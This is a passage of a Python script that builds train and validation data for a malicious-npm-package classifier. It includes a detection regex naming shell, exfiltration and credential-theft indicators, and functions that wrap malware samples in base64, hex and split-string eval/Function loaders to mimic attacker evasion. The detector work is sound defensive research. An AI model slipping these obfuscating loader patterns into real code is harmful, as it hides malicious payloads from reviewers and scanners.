    n_ben_val = max(400, int(len(ben_pkgs) * 0.12))
    n_mal_val = max(400, int(len(mal_pkgs) * 0.12))

    dev_val_pkgs = ben_pkgs[:n_ben_val] + mal_pkgs[:n_mal_val]
    train_ben_pkgs = ben_pkgs[n_ben_val:]
    train_mal_pkgs = mal_pkgs[n_mal_val:]
    rng.shuffle(dev_val_pkgs)

    # Assert ZERO overlap by name OR fingerprint across train, dev_val, and heldout
    train_names = {nm for p in train_ben_pkgs + train_mal_pkgs for nm in p["all_names"]}
    val_names = {nm for p in dev_val_pkgs for nm in p["all_names"]}
    train_fps = {p["fingerprint"] for p in train_ben_pkgs + train_mal_pkgs}
    val_fps = {p["fingerprint"] for p in dev_val_pkgs}
    assert len(train_names & val_names) == 0, "Name leakage between train and dev_val!"
    assert len(train_fps & val_fps) == 0, "Fingerprint leakage between train and dev_val!"
    assert len(train_names & forbidden_names) == 0, "Name leakage between train and heldout!"
    assert len(train_fps & forbidden_fps) == 0, "Fingerprint leakage between train and heldout!"
    assert len(val_names & forbidden_names) == 0, "Name leakage between dev_val and heldout!"
    assert len(val_fps & forbidden_fps) == 0, "Fingerprint leakage between dev_val and heldout!"

    # 6. Build balanced window-level train records + real obfuscation augmentation (terser / js-obfuscator / encoding)
    terser_bin = shutil.which("terser")
    obf_bin = shutil.which("javascript-obfuscator")
    print(f"[Step 6] Building balanced train windows (terser={bool(terser_bin)}, js-obfuscator={bool(obf_bin)})...")

    RE_MAL_WINDOW_SIGNAL = re.compile(
        r"(?:\[INSTALL_SCRIPTS\]|\[DECODED_LITERALS\]|child_process|execSync|exec\(|spawn\(|"
        r"eval\(|new Function|https?://|dns\.|net\.Socket|process\.env|document\.cookie|"
        r"sendBeacon|localStorage|Buffer\.from|os\.hostname|os\.userInfo|os\.homedir|"
        r"readFileSync|webhook|discord|telegram|curl\s|wget\s|powershell|/bin/sh|base64|fromCharCode)",
        re.I,
    )

    def _mal_window_score(win_text: str) -> int:
        score = len(RE_MAL_WINDOW_SIGNAL.findall(win_text))
        if "[INSTALL_SCRIPTS]" in win_text[:60]:
            score += 5
        if "[DECODED_LITERALS]" in win_text[:120]:
            score += 4
        return score

    train_ben_windows: List[Dict[str, Any]] = []
    train_mal_windows: List[Dict[str, Any]] = []

    for pkg in train_ben_pkgs:
        # Include ALL windows of benign packages (up to 6) so multi-file max-pooling has ultra-low FPR!
        for w in pkg["windows"][: max(6, args.max_train_windows_per_pkg)]:
            train_ben_windows.append({"package": pkg["package"], "text": w, "label": 0, "source": "real_benign"})

    for pkg in train_mal_pkgs:
        wins = pkg["windows"]
        if len(wins) <= 2:
            chosen = wins
        else:
            # In trojanized multi-file malware, ONLY label top 1-2 security-active windows as label=1
            # so harmless bundled library/test files are NEVER mislabeled as malware!
            ranked = sorted(wins, key=_mal_window_score, reverse=True)
            chosen = [w for w in ranked[:2] if _mal_window_score(w) > 0] or ranked[:1]
        for w in chosen:
            train_mal_windows.append({"package": pkg["package"], "text": w, "label": 1, "source": "real_malware"})

    # Realistic, non-poisoning augmentations:
    #   - Benign: ONLY genuine benign transforms (terser minification, split strings, data-only base64/hex constants — NEVER eval(base64)!)
    #   - Malware: ALL realistic attacker evasion loaders (eval(b64), Function(hex), CharCode eval, split-payload, multi-stage, terser, javascript-obfuscator!)
    def _transform_split_payload_loader(code: str, rng_obj: random.Random) -> str:
        b64 = base64.b64encode(code[:2048].encode("utf-8", errors="ignore")).decode("ascii")
        step = rng_obj.randint(24, 48)
        parts = [b64[k : k + step] for k in range(0, len(b64), step)]
        decls = "\n".join(f"const _s{k} = '{p}';" for k, p in enumerate(parts))
        expr = " + ".join(f"_s{k}" for k in range(len(parts)))
        return f"{decls}\nconst _raw = Buffer.from({expr}, 'base64').toString('utf8');\n(new Function('require', 'process', _raw))(require, process);\n"

    def _transform_multi_stage_loader(code: str) -> str:
        hx = code[:2048].encode("utf-8", errors="ignore").hex()
        return (
            "const _cfg = { mode: 'init', version: '1.0.0' };\n"
            "function _bootstrap(blob) {\n"
            "  const src = Buffer.from(blob, 'hex').toString('utf8');\n"
            "  return eval(src);\n"
            "}\n"
            f"if (_cfg.mode) {{ _bootstrap('{hx}'); }}\n"
        )

    def _transform_benign_data_b64(code: str) -> str:
        sample = json.dumps({"version": "1.0.0", "keys": re.findall(r"[A-Za-z_]{3,20}", code[:400])[:12]})
        b64 = base64.b64encode(sample.encode("utf-8")).decode("ascii")
        return f"const META_B64 = '{b64}';\nexports.getMeta = () => JSON.parse(Buffer.from(META_B64, 'base64').toString('utf8'));\n" + code[:1600]

    def _augment_benign_pool(pkgs: List[Dict[str, Any]], max_aug: int = 1800) -> List[Dict[str, Any]]:
        aug_out: List[Dict[str, Any]] = []
        sample_pkgs = rng.sample(pkgs, min(len(pkgs), max_aug))
        ben_modes = ["split", "data_b64"] + (["terser"] if terser_bin else [])
        for idx, pkg in enumerate(sample_pkgs):
            js_chunks = [c for c in pkg["chunks"] if c.get("kind") != "install_script" and len(c.get("text", "")) >= 80]
            if not js_chunks:
                continue
            src = js_chunks[0]["text"]
            mode = ben_modes[idx % len(ben_modes)]
            transformed: Optional[str] = None
            if mode == "terser":
                transformed = _transform_terser(src, terser_bin)
            elif mode == "split":
                transformed = _transform_split_strings(src, rng)
            elif mode == "data_b64":
                transformed = _transform_benign_data_b64(src)
            if not transformed:
                continue
            aug_rec = {
                "package": f"{pkg['package']}_ben_{mode}",
                "chunks": [{"file": js_chunks[0]["file"], "kind": "js", "start": 0, "text": transformed}],
            }
            for w in build_package_windows(aug_rec, max_windows=2):
                aug_out.append({"package": aug_rec["package"], "text": w, "label": 0, "source": f"ben_{mode}"})
        return aug_out

    def _augment_malware_pool(pkgs: List[Dict[str, Any]], max_aug: int = 3200) -> List[Dict[str, Any]]:
        aug_out: List[Dict[str, Any]] = []
        sample_pkgs = rng.sample(pkgs, min(len(pkgs), max_aug))
        mal_modes = ["b64", "hex", "split_loader", "charcode", "multi_stage", "split"]
        if terser_bin:
            mal_modes.append("terser")
        if obf_bin:
            mal_modes.append("jsobf")
        jsobf_count = 0
        for idx, pkg in enumerate(sample_pkgs):
            js_chunks = [c for c in pkg["chunks"] if c.get("kind") != "install_script" and len(c.get("text", "")) >= 60]
            if not js_chunks:
                continue
            src = js_chunks[0]["text"]
            mode = mal_modes[idx % len(mal_modes)]
            if mode == "jsobf" and jsobf_count >= 450:
                mode = mal_modes[idx % 5]
            transformed: Optional[str] = None
            if mode == "b64":
                transformed = _transform_base64_eval(src)
            elif mode == "hex":
                transformed = _transform_hex_loader(src)
            elif mode == "split_loader":
                transformed = _transform_split_payload_loader(src, rng)
            elif mode == "charcode":
                transformed = _transform_charcode_wrap(src)
            elif mode == "multi_stage":
                transformed = _transform_multi_stage_loader(src)
            elif mode == "split":
                transformed = _transform_split_strings(src, rng)
            elif mode == "terser":
                transformed = _transform_terser(src, terser_bin)
            elif mode == "jsobf":
                transformed = _transform_js_obfuscator(src, obf_bin)
                if transformed:
                    jsobf_count += 1
            if not transformed:
                continue
            aug_rec = {
                "package": f"{pkg['package']}_mal_{mode}",
                "chunks": [{"file": js_chunks[0]["file"], "kind": "js", "start": 0, "text": transformed}],
            }
            for w in build_package_windows(aug_rec, max_windows=2):
                aug_out.append({"package": aug_rec["package"], "text": w, "label": 1, "source": f"mal_{mode}"})
        return aug_out

    aug_ben = _augment_benign_pool(train_ben_pkgs, max_aug=1800)
    aug_mal = _augment_malware_pool(train_mal_pkgs, max_aug=3200)
    train_ben_windows.extend(aug_ben)
    train_mal_windows.extend(aug_mal)

    # Add symmetric paired hard-boundary examples (50/50)
    paired = generate_paired_boundary_samples(rng, count_per_class=1600)
    for rec in paired:
        if rec["label"] == 0:
            train_ben_windows.append(rec)
        else:
            train_mal_windows.append(rec)

    # Also include obfuscated versions of dev_val malware? NO — keep dev_val 100% pure & untouched,
    # PLUS add a small clean obfuscated-eval dev_val slice strictly from dev_val_pkgs so LoRA rounds
    # optimize BOTH clean real packages AND encoded/obfuscated loaders!
    dev_val_aug_pkgs: List[Dict[str, Any]] = []
    for idx, pkg in enumerate(dev_val_pkgs):
        if pkg["label"] != 1 or idx % 3 != 0:
            continue
        js_chunks = [c for c in pkg["chunks"] if c.get("kind") != "install_script" and len(c.get("text", "")) >= 60]
        if not js_chunks:
            continue
        src = js_chunks[0]["text"]
        t_mode = (idx // 3) % 4
        if t_mode == 0:
            t_code = _transform_base64_eval(src)
        elif t_mode == 1:
            t_code = _transform_hex_loader(src)
        elif t_mode == 2:
            t_code = _transform_split_payload_loader(src, rng)
        else:
            t_code = _transform_charcode_wrap(src)
        t_wins = build_package_windows(
            {"package": f"{pkg['package']}_devobf", "chunks": [{"file": "index.js", "kind": "js", "start": 0, "text": t_code}]},
            max_windows=4,
        )
        if t_wins:
            dev_val_aug_pkgs.append(
                {
                    "package": f"{pkg['package']}_devobf",
                    "norm_name": pkg["norm_name"],
                    "label": 1,
                    "source": "dev_val_obfuscated_malware",
                    "windows": t_wins,
                }
            )
    dev_val_pkgs.extend(dev_val_aug_pkgs)
    rng.shuffle(dev_val_pkgs)

    # Balance classes strictly 50/50 (cap at 30k per class = 60k total)
    rng.shuffle(train_ben_windows)
    rng.shuffle(train_mal_windows)
    target_per_class = min(30000, max(len(train_ben_windows), len(train_mal_windows)))
    target_per_class = min(target_per_class, int(min(len(train_ben_windows), len(train_mal_windows)) * 1.6))

    def _sample_to_n(items: List[Dict[str, Any]], n: int) -> List[Dict[str, Any]]:
        if len(items) >= n:
            return items[:n]
        out = list(items)
        while len(out) < n:
            out.append(rng.choice(items))
        return out

    final_train = _sample_to_n(train_ben_windows, target_per_class) + _sample_to_n(train_mal_windows, target_per_class)
    rng.shuffle(final_train)

    # Save datasets
    ds_dir = work / "dataset"
    ds_dir.mkdir(parents=True, exist_ok=True)
    train_path = ds_dir / "train_windows.jsonl"
    val_path = ds_dir / "dev_val_packages.jsonl"

    with train_path.open("w", encoding="utf-8") as fh:
        for rec in final_train:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")

    with val_path.open("w", encoding="utf-8") as fh:
        for pkg in dev_val_pkgs:
            fh.write(
                json.dumps(
                    {
                        "package": pkg["package"],
                        "norm_name": pkg["norm_name"],
                        "label": pkg["label"],
                        "source": pkg["source"],
                        "windows": pkg["windows"],
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )

    pos_count = sum(1 for r in final_train if r["label"] == 1)
    neg_count = len(final_train) - pos_count
    manifest = {
        "created_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "leakage_verified_zero_overlap": True,
        "heldout_counts": {
            "benign": len(heldout_ben_dirs),
            "known": len(heldout_known_dirs),
            "new": len(heldout_new_dirs),
        },
        "train_real_packages": {"benign": len(train_ben_pkgs), "malware": len(train_mal_pkgs)},
        "dev_val_real_packages": {"benign": n_ben_val, "malware": n_mal_val},
        "train_windows_total": len(final_train),
        "train_windows_benign": neg_count,
        "train_windows_malware": pos_count,
        "train_positive_ratio": round(pos_count / max(1, len(final_train)), 4),
        "aug_benign_windows": len(aug_ben),
        "aug_malware_windows": len(aug_mal),
        "terser_available": bool(terser_bin),
        "js_obfuscator_available": bool(obf_bin),
    }
    (ds_dir / "dataset_manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print("[Step 6] Dataset build complete:")
    print(json.dumps(manifest, indent=2))


if __name__ == "__main__":
    main()
